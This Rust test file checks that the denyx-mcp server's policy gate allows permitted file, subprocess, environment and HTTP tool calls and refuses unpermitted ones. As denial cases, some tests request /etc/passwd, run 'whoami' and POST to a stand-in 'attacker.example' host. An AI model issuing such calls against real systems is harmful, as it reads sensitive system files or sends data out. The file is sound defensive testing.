//! End-to-end tests for the per-capability MCP sugar tools.
//!
//! `denyx_run` (the primary tool) is heavily exercised by the
//! orchestrated harness, the elicitation tests, and the server-mode
//! tests. The sugar variants — `denyx_fs_read`, `denyx_fs_write`,
//! `denyx_fs_delete`, `denyx_subprocess_exec`, `denyx_net_http_get`,
//! `denyx_net_http_post`, `denyx_env_read` — are part of the MCP
//! wire surface but were under-covered (the dispatch arms in
//! `crates/mcp/src/main.rs::dispatch` had ~57% line coverage).
//!
//! These tests drive each sugar tool through the full JSON-RPC
//! roundtrip, verifying both happy-path behaviour and that the
//! policy gate fires on denied calls. The shape is intentionally
//! close to a host's real usage: build a permissive-for-test policy,
//! send a `tools/call` for the named sugar, assert on the result.

use std::io::{BufRead, BufReader, Write};
use std::path::PathBuf;
use std::process::{Child, ChildStdin, ChildStdout, Command, Stdio};

use serde_json::{json, Value};

const BIN: &str = env!("CARGO_BIN_EXE_denyx-mcp");

fn write_policy(suffix: &str, body: &str) -> (PathBuf, PathBuf) {
    let dir = std::env::temp_dir().join(format!(
        "denyx_mcp_sugar_{}_{}_{}",
        suffix,
        std::process::id(),
        std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos()
    ));
    std::fs::create_dir_all(&dir).unwrap();
    let path = dir.join("denyx.toml");
    std::fs::write(&path, body).unwrap();
    (dir, path)
}

struct Session {
    child: Child,
    stdin: ChildStdin,
    stdout: BufReader<ChildStdout>,
    line: String,
}

impl Session {
    fn spawn(policy: &PathBuf) -> Session {
        let mut child = Command::new(BIN)
            .arg("--policy")
            .arg(policy)
            .arg("--confirm-mode")
            .arg("auto-allow")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .expect("spawn denyx-mcp");
        let stdin = child.stdin.take().unwrap();
        let stdout = BufReader::new(child.stdout.take().unwrap());
        Session {
            child,
            stdin,
            stdout,
            line: String::new(),
        }
    }
    fn send(&mut self, msg: &Value) {
        let line = serde_json::to_string(msg).unwrap();
        writeln!(self.stdin, "{line}").unwrap();
    }
    fn recv(&mut self) -> Value {
        self.line.clear();
        let n = self.stdout.read_line(&mut self.line).expect("read");
        assert!(n > 0, "server closed stdout");
        serde_json::from_str(self.line.trim()).expect("parse")
    }
    fn handshake(&mut self) {
        self.send(&json!({
            "jsonrpc": "2.0", "id": 1, "method": "initialize",
            "params": {"protocolVersion": "2024-11-05", "capabilities": {}}
        }));
        let _ = self.recv();
        self.send(&json!({"jsonrpc": "2.0", "method": "notifications/initialized"}));
        let _ = self.recv();
    }
    fn close(mut self) {
        drop(self.stdin);
        let _ = self.child.wait();
    }
}

// ---- denyx_fs_read --------------------------------------------------------

#[test]
fn sugar_fs_read_returns_file_contents() {
    let dir = std::env::temp_dir().join(format!("denyx_sugar_read_{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let target = dir.join("hello.txt");
    std::fs::write(&target, "hello from disk").unwrap();
    let abs = dir.to_string_lossy().replace('\\', "/");
    let (pdir, ppath) = write_policy(
        "fs_read",
        &format!(
            r#"
[filesystem]
read_allow = ["{abs}/**"]
"#
        ),
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_fs_read", "arguments": {"path": target.to_string_lossy()}}
    }));
    let resp = s.recv();
    let result = &resp["result"];
    assert_eq!(result["isError"], false, "{resp}");
    let text = result["content"][0]["text"].as_str().unwrap_or("");
    assert!(text.contains("hello from disk"), "got: {text}");
    s.close();
    let _ = std::fs::remove_dir_all(&dir);
    let _ = std::fs::remove_dir_all(&pdir);
}

#[test]
fn sugar_fs_read_denied_when_outside_allow_list() {
    let (pdir, ppath) = write_policy(
        "fs_read_denied",
        r#"
[filesystem]
read_allow = ["/this/path/does/not/exist/**"]
"#,
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_fs_read", "arguments": {"path": "/etc/passwd"}}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], true, "{resp}");
    s.close();
    let _ = std::fs::remove_dir_all(&pdir);
}

#[test]
fn sugar_fs_read_missing_path_arg() {
    // The dispatch arm should reject bad input cleanly rather than
    // panic.
    let (pdir, ppath) = write_policy(
        "fs_read_missing_arg",
        r#"
[filesystem]
read_allow = ["/tmp/**"]
"#,
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_fs_read", "arguments": {}}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], true, "{resp}");
    let text = resp["result"]["content"][0]["text"].as_str().unwrap_or("");
    assert!(
        text.contains("path"),
        "error should name the missing arg: {text}"
    );
    s.close();
    let _ = std::fs::remove_dir_all(&pdir);
}

// ---- denyx_fs_write -------------------------------------------------------

#[test]
fn sugar_fs_write_creates_file() {
    let dir = std::env::temp_dir().join(format!("denyx_sugar_write_{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let target = dir.join("written.txt");
    let abs = dir.to_string_lossy().replace('\\', "/");
    let (pdir, ppath) = write_policy(
        "fs_write",
        &format!(
            r#"
[filesystem]
write_allow = ["{abs}/**"]
"#
        ),
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_fs_write", "arguments": {
            "path": target.to_string_lossy(),
            "content": "fresh bytes"
        }}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], false, "{resp}");
    assert_eq!(std::fs::read_to_string(&target).unwrap(), "fresh bytes");
    s.close();
    let _ = std::fs::remove_dir_all(&dir);
    let _ = std::fs::remove_dir_all(&pdir);
}

#[test]
fn sugar_fs_write_denied_outside_allow() {
    let (pdir, ppath) = write_policy(
        "fs_write_denied",
        r#"
[filesystem]
write_allow = ["/this/does/not/exist/**"]
"#,
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_fs_write", "arguments": {
            "path": "/tmp/should_not_be_written.txt",
            "content": "x"
        }}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], true, "{resp}");
    assert!(!std::path::Path::new("/tmp/should_not_be_written.txt").exists());
    s.close();
    let _ = std::fs::remove_dir_all(&pdir);
}

// ---- denyx_fs_delete ------------------------------------------------------

#[test]
fn sugar_fs_delete_removes_file() {
    let dir = std::env::temp_dir().join(format!("denyx_sugar_delete_{}", std::process::id()));
    std::fs::create_dir_all(&dir).unwrap();
    let target = dir.join("victim.txt");
    std::fs::write(&target, "to be deleted").unwrap();
    let abs = dir.to_string_lossy().replace('\\', "/");
    let (pdir, ppath) = write_policy(
        "fs_delete",
        &format!(
            r#"
[filesystem]
delete_allow = ["{abs}/**"]
"#
        ),
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_fs_delete", "arguments": {"path": target.to_string_lossy()}}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], false, "{resp}");
    assert!(!target.exists(), "file should be gone");
    s.close();
    let _ = std::fs::remove_dir_all(&dir);
    let _ = std::fs::remove_dir_all(&pdir);
}

// ---- denyx_subprocess_exec ------------------------------------------------

#[test]
fn sugar_subprocess_exec_runs_allowed_command() {
    let (pdir, ppath) = write_policy(
        "subprocess",
        r#"
[subprocess]
allow_commands = ["echo"]
"#,
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_subprocess_exec", "arguments": {
            "argv": ["echo", "from-denyx-mcp-test"]
        }}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], false, "{resp}");
    let text = resp["result"]["content"][0]["text"].as_str().unwrap_or("");
    assert!(text.contains("from-denyx-mcp-test"), "got: {text}");
    s.close();
    let _ = std::fs::remove_dir_all(&pdir);
}

#[test]
fn sugar_subprocess_exec_denies_unlisted_command() {
    let (pdir, ppath) = write_policy(
        "subprocess_denied",
        r#"
[subprocess]
allow_commands = ["echo"]
"#,
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_subprocess_exec", "arguments": {
            "argv": ["whoami"]
        }}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], true, "{resp}");
    s.close();
    let _ = std::fs::remove_dir_all(&pdir);
}

#[test]
fn sugar_subprocess_exec_rejects_empty_argv() {
    let (pdir, ppath) = write_policy(
        "subprocess_empty",
        r#"
[subprocess]
allow_commands = ["echo"]
"#,
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_subprocess_exec", "arguments": {"argv": []}}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], true, "{resp}");
    s.close();
    let _ = std::fs::remove_dir_all(&pdir);
}

// ---- denyx_env_read -------------------------------------------------------

#[test]
fn sugar_env_read_returns_value_for_allowed_var() {
    let var_name = format!("DENYX_SUGAR_TEST_{}", std::process::id());
    std::env::set_var(&var_name, "expected-value");
    let (pdir, ppath) = write_policy(
        "env_read",
        &format!(
            r#"
[environment]
allow_vars = ["{var_name}"]
"#
        ),
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_env_read", "arguments": {"name": var_name}}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], false, "{resp}");
    let text = resp["result"]["content"][0]["text"].as_str().unwrap_or("");
    assert!(text.contains("expected-value"), "got: {text}");
    s.close();
    std::env::remove_var(&var_name);
    let _ = std::fs::remove_dir_all(&pdir);
}

#[test]
fn sugar_env_read_denied_for_unlisted_var() {
    let (pdir, ppath) = write_policy(
        "env_read_denied",
        r#"
[environment]
allow_vars = ["PATH"]
"#,
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_env_read", "arguments": {"name": "SOME_OTHER_VAR"}}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], true, "{resp}");
    s.close();
    let _ = std::fs::remove_dir_all(&pdir);
}

// ---- net.http_get / http_post ---------------------------------------------
//
// Real network calls are flaky in CI. We exercise the dispatch arm by
// pointing at a host the policy denies, asserting the policy gate
// fires. End-to-end round-trips against a real server are covered by
// the orchestrated harness and the manual smoke tests.

#[test]
fn sugar_net_http_get_denies_unlisted_host() {
    let (pdir, ppath) = write_policy(
        "http_get_denied",
        r#"
[network]
http_get_allow = ["api.github.com"]
"#,
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_net_http_get", "arguments": {"url": "https://example.com/"}}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], true, "{resp}");
    s.close();
    let _ = std::fs::remove_dir_all(&pdir);
}

#[test]
fn sugar_net_http_post_denies_unlisted_host() {
    let (pdir, ppath) = write_policy(
        "http_post_denied",
        r#"
[network]
http_post_allow = ["api.example.com"]
"#,
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_net_http_post", "arguments": {
            "url": "https://attacker.example/",
            "body": "x"
        }}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], true, "{resp}");
    s.close();
    let _ = std::fs::remove_dir_all(&pdir);
}

#[test]
fn sugar_unknown_tool_returns_error() {
    let (pdir, ppath) = write_policy(
        "unknown_tool",
        r#"
[filesystem]
read_allow = ["/tmp/**"]
"#,
    );
    let mut s = Session::spawn(&ppath);
    s.handshake();
    s.send(&json!({
        "jsonrpc": "2.0", "id": 2, "method": "tools/call",
        "params": {"name": "denyx_does_not_exist", "arguments": {}}
    }));
    let resp = s.recv();
    assert_eq!(resp["result"]["isError"], true, "{resp}");
    let text = resp["result"]["content"][0]["text"].as_str().unwrap_or("");
    assert!(
        text.contains("unknown") || text.contains("not"),
        "got: {text}"
    );
    s.close();
    let _ = std::fs::remove_dir_all(&pdir);
}
